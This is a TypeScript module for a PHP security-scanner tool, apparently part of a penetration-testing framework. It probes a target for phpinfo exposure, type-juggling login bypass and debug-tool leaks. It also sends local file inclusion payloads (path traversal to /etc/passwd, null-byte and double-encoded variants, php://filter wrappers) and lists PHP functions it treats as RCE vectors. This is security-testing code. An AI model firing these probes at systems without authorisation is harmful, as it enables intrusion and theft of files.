// php stack checks — ported 1:1 from infra-security-mcp `providers/php`.
// Every path/payload/condition matches the source exactly; only the transport
// (scope-guarded webhook sender) and the Check/severity adapter are CyberStrike's.
import z from "zod"
import { defineWebhookTool } from "../define"
import type { HttpSender } from "../transport"
import { get, header, failed, ok, base, summarize, type Check, type Severity } from "./shared"

const SEV: Severity[] = ["info", "low", "medium", "high", "critical"]
const top = (list: Severity[]): Severity => list.reduce((a, b) => (SEV.indexOf(b) > SEV.indexOf(a) ? b : a), "info" as Severity)

// phpinfo() page locations — shared by info_exposure and disable_functions.
const PHPINFO_PATHS = [
  "/info.php", "/phpinfo.php", "/test.php", "/i.php", "/pi.php",
  "/php_info.php", "/php-info.php", "/infos.php", "/_info.php",
  "/temp.php", "/old.php", "/debug.php",
]

export namespace Php {
  export async function detect(sender: HttpSender, origin: string): Promise<Check> {
    const findings: string[] = []

    const main = await get(sender, origin)
    const mainBody = ok(main) ? main.body : ""

    const poweredBy = ok(main) ? header(main, "x-powered-by") : ""
    if (poweredBy.toLowerCase().includes("php")) findings.push(`X-Powered-By: ${poweredBy} (version disclosure)`)

    const cookie = ok(main) ? header(main, "set-cookie") : ""
    if (cookie.includes("PHPSESSID")) findings.push("PHPSESSID session cookie detected")

    if (mainBody.includes(".php")) findings.push(".php file extensions found in page links")

    const bogus = await get(sender, `${origin}/${crypto.randomUUID().slice(0, 8)}.php`)
    const bogusBody = ok(bogus) ? bogus.body : ""
    if (bogusBody.includes("Fatal error") || bogusBody.includes("Parse error") || bogusBody.includes("Warning:")) {
      findings.push("PHP error messages in response")
    }

    const phpExt = await get(sender, `${origin}/index.php`)
    if (ok(phpExt) && phpExt.status === 200) findings.push("index.php responds with 200")

    if (findings.length === 0) return { check: "detect", hit: false, severity: "info", detail: "PHP not detected" }
    return { check: "detect", hit: true, severity: "info", detail: findings.join("; "), evidence: findings.join(" | ") }
  }

  export async function infoExposure(sender: HttpSender, origin: string): Promise<Check> {
    const paths = PHPINFO_PATHS

    const found: { path: string; serverSoftware?: string; phpVersion?: string; documentRoot?: string; disableFunctions?: string; openBasedir?: string }[] = []

    for (const p of paths) {
      const res = await get(sender, `${origin}${p}`)
      if (failed(res)) continue
      if (res.status === 200 && (res.body.includes("phpinfo()") || res.body.includes("PHP Version") || res.body.includes("Configuration File"))) {
        const info: (typeof found)[0] = { path: p }

        const verMatch = res.body.match(/PHP Version<\/td><td class="v">([^<]+)/)
        if (verMatch) info.phpVersion = verMatch[1]

        const serverMatch = res.body.match(/SERVER_SOFTWARE<\/td><td class="v">([^<]+)/)
        if (serverMatch) info.serverSoftware = serverMatch[1]

        const docRootMatch = res.body.match(/DOCUMENT_ROOT<\/td><td class="v">([^<]+)/)
        if (docRootMatch) info.documentRoot = docRootMatch[1]

        const disableMatch = res.body.match(/disable_functions<\/td><td class="v">([^<]+)/)
        if (disableMatch) info.disableFunctions = disableMatch[1]

        const basedirMatch = res.body.match(/open_basedir<\/td><td class="v">([^<]+)/)
        if (basedirMatch) info.openBasedir = basedirMatch[1]

        found.push(info)
      }
    }

    if (found.length === 0) return { check: "info_exposure", hit: false, severity: "info", detail: "no exposed phpinfo() page" }
    return {
      check: "info_exposure",
      hit: true,
      severity: "high",
      detail: `phpinfo() exposed at ${found.map((f) => f.path).join(", ")}`,
      evidence: found.map((f) => `${f.path} (PHP ${f.phpVersion ?? "?"}, ${f.serverSoftware ?? "?"})`).join("; "),
    }
  }

  export async function typeJuggle(sender: HttpSender, origin: string): Promise<Check> {
    const param = "password"
    const baseBody: Record<string, unknown> = {}
    const findings: { payload: string; status: number; behaviorChange: string }[] = []

    const baseline = await sender.send({
      method: "POST",
      url: origin,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ ...baseBody, [param]: "definitely_wrong_value_12345" }),
    })
    if (failed(baseline)) return { check: "type_juggle", hit: false, severity: "info", detail: "no baseline response" }

    const jugglePayloads: [string, unknown][] = [
      ["integer 0", 0],
      ["boolean false", false],
      ["boolean true", true],
      ["empty string", ""],
      ["null", null],
      ["empty array", []],
      ["string '0'", "0"],
    ]

    for (const [name, value] of jugglePayloads) {
      const test = await sender.send({
        method: "POST",
        url: origin,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ...baseBody, [param]: value }),
      })
      if (failed(test)) continue

      if (test.status !== baseline.status) {
        findings.push({ payload: `${param}=${name}`, status: test.status, behaviorChange: `Status changed from ${baseline.status} to ${test.status}` })
      } else if (test.body.length !== baseline.body.length && Math.abs(test.body.length - baseline.body.length) > 50) {
        findings.push({ payload: `${param}=${name}`, status: test.status, behaviorChange: `Response body size changed significantly (${baseline.body.length} → ${test.body.length})` })
      }
    }

    if (findings.length === 0) return { check: "type_juggle", hit: false, severity: "info", detail: `no type-juggle behavior change on '${param}' (baseline ${baseline.status})` }
    return {
      check: "type_juggle",
      hit: true,
      severity: "medium",
      detail: findings.map((f) => `${f.payload}: ${f.behaviorChange}`).join("; "),
      evidence: `baselineStatus=${baseline.status}`,
    }
  }

  export async function fileInclusion(sender: HttpSender, origin: string): Promise<Check> {
    const params = ["page", "file", "include", "path", "template", "doc", "view", "content", "lang", "module"]

    const payloads = [
      { name: "passwd_traversal", value: "../../../../../../etc/passwd", indicator: "root:" },
      { name: "windows_hosts", value: "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", indicator: "localhost" },
      { name: "null_byte_passwd", value: "../../../../../../etc/passwd%00", indicator: "root:" },
      { name: "php_filter_base64", value: "php://filter/convert.base64-encode/resource=index", indicator: "PD9" },
      { name: "php_filter_config", value: "php://filter/convert.base64-encode/resource=../config", indicator: "PD9" },
      { name: "double_encode", value: "%252e%252e%252f%252e%252e%252fetc/passwd", indicator: "root:" },
    ]

    const findings: { parameter: string; payload: string; evidence: string }[] = []

    for (const p of params) {
      for (const { name, value, indicator } of payloads) {
        const url = new URL(origin)
        url.searchParams.set(p, value)
        const res = await get(sender, url.toString())
        if (failed(res)) continue

        if (res.body.includes(indicator)) {
          findings.push({ parameter: p, payload: `${name}: ${value}`, evidence: `Response contains '${indicator}' — file inclusion confirmed` })
        }
      }
    }

    if (findings.length === 0) return { check: "file_inclusion", hit: false, severity: "info", detail: "no LFI signal" }
    return {
      check: "file_inclusion",
      hit: true,
      severity: "critical",
      detail: findings.map((f) => `${f.parameter} ${f.payload}: ${f.evidence}`).join("; "),
      evidence: findings[0].evidence,
    }
  }

  export async function disableFunctions(sender: HttpSender, origin: string): Promise<Check> {
    const dangerousFunctions = [
      "exec", "system", "passthru", "shell_exec", "popen", "proc_open",
      "pcntl_exec", "eval", "assert", "preg_replace", "create_function",
      "call_user_func", "call_user_func_array", "array_map", "usort",
      "file_get_contents", "file_put_contents", "fopen", "fwrite",
      "include", "include_once", "require", "require_once",
      "mail", "putenv", "dl", "ini_set",
    ]

    for (const p of PHPINFO_PATHS) {
      const res = await get(sender, `${origin}${p}`)
      if (failed(res)) continue
      if (!res.body.includes("phpinfo()") && !res.body.includes("PHP Version")) continue

      const disableMatch = res.body.match(/disable_functions<\/td><td class="v">([^<]*)/)
      const disabled = disableMatch?.[1]?.split(",").map((f) => f.trim()).filter(Boolean) ?? []

      const available = dangerousFunctions.filter((f) => !disabled.includes(f))
      const rceVectors = available.filter((f) => ["exec", "system", "passthru", "shell_exec", "popen", "proc_open", "pcntl_exec"].includes(f))
      const risk: Severity = rceVectors.length > 0 ? "high" : available.length > 5 ? "medium" : "low"

      return {
        check: "disable_functions",
        hit: available.length > 0,
        severity: risk,
        detail: `disable_functions parsed from ${p}: ${disabled.length} disabled; direct RCE vectors: ${rceVectors.join(", ") || "none"}; dangerous available: ${available.length}`,
        evidence: `rce=[${rceVectors.join(",")}] available=[${available.join(",")}]`,
      }
    }

    return { check: "disable_functions", hit: false, severity: "info", detail: "no phpinfo() page found to parse disable_functions" }
  }

  export async function debugExposure(sender: HttpSender, origin: string): Promise<Check> {
    const findings: { check: string; severity: Severity; details: string }[] = []

    const xdebug = await get(sender, origin, { Cookie: "XDEBUG_SESSION=phpstorm" })
    const xdebugHeader = ok(xdebug) ? header(xdebug, "x-xdebug-profile-filename") : ""
    if (xdebugHeader) {
      findings.push({ check: "xdebug_active", severity: "critical", details: `Xdebug profiling active: ${xdebugHeader}` })
    }

    const bogus = await get(sender, `${origin}/${crypto.randomUUID().slice(0, 8)}`)
    const bogusBody = ok(bogus) ? bogus.body : ""
    if (bogusBody.includes("Ignition") || bogusBody.includes("ignition-ui") || bogusBody.includes("flare-client")) {
      findings.push({ check: "laravel_ignition", severity: "critical", details: "Laravel Ignition error page exposed — reveals source code, environment, DB config" })
    }
    if (bogusBody.includes("Whoops") || bogusBody.includes("filp/whoops")) {
      findings.push({ check: "whoops_handler", severity: "high", details: "Whoops error handler active — shows full stack traces and source" })
    }

    const profilerPaths = ["/_profiler/", "/_profiler/latest", "/_wdt/"]
    for (const p of profilerPaths) {
      const res = await get(sender, `${origin}${p}`)
      if (ok(res) && res.status === 200 && (res.body.includes("Symfony Profiler") || res.body.includes("sf-toolbar") || res.body.includes("profiler"))) {
        findings.push({ check: "symfony_profiler", severity: "high", details: `Symfony Web Profiler at ${p} — leaks request details, DB queries, config` })
        break
      }
    }

    const telescope = await get(sender, `${origin}/telescope`)
    if (ok(telescope) && telescope.status === 200 && (telescope.body.includes("Laravel Telescope") || telescope.body.includes("telescope-app"))) {
      findings.push({ check: "laravel_telescope", severity: "high", details: "Laravel Telescope exposed — shows all requests, exceptions, queries, mail, notifications" })
    }

    const horizon = await get(sender, `${origin}/horizon`)
    if (ok(horizon) && horizon.status === 200 && horizon.body.includes("Laravel Horizon")) {
      findings.push({ check: "laravel_horizon", severity: "medium", details: "Laravel Horizon dashboard exposed — shows queue workers and job details" })
    }

    if (findings.length === 0) return { check: "debug_exposure", hit: false, severity: "info", detail: "no PHP debug tool exposed" }
    return {
      check: "debug_exposure",
      hit: true,
      severity: top(findings.map((f) => f.severity)),
      detail: findings.map((f) => `${f.check}[${f.severity}]: ${f.details}`).join("; "),
      evidence: findings.map((f) => f.check).join(", "),
    }
  }

  const RUNNERS: Record<string, (s: HttpSender, o: string) => Promise<Check>> = {
    detect,
    info_exposure: infoExposure,
    type_juggle: typeJuggle,
    file_inclusion: fileInclusion,
    disable_functions: disableFunctions,
    debug_exposure: debugExposure,
  }

  export async function run(sender: HttpSender, origin: string, which: string): Promise<Check[]> {
    const names = which === "all" ? Object.keys(RUNNERS) : [which]
    const out: Check[] = []
    for (const n of names) out.push(await RUNNERS[n](sender, origin))
    return out
  }
}

const DESCRIPTION = `PHP deterministic checks (detection via X-Powered-By/PHPSESSID/.php errors, phpinfo() exposure, type-juggling auth bypass, Local File Inclusion via traversal + php:// wrappers, disable_functions RCE-surface analysis from phpinfo, debug-tool exposure — Xdebug/Ignition/Whoops/Symfony Profiler/Telescope/Horizon). 1:1 port of the infra-security php provider.

Run after Vortex fingerprints PHP. Probes go through the scope-guarded replay engine. check="all" (default) runs every check.`

export const PhpTestTool = defineWebhookTool({
  name: "php_test",
  description: DESCRIPTION,
  parameters: z.object({
    target: z.string().describe("Target origin or URL (e.g. https://target.com)."),
    check: z
      .enum(["all", "detect", "info_exposure", "type_juggle", "file_inclusion", "disable_functions", "debug_exposure"])
      .default("all")
      .describe("Which check to run; 'all' runs every PHP check."),
  }),
  async run(params, ctx) {
    const origin = base(params.target)
    const results = await Php.run(ctx.sender, origin, params.check)
    return { target: origin, results }
  },
  format(r) {
    return summarize("php_test", r.target, r.results)
  },
})
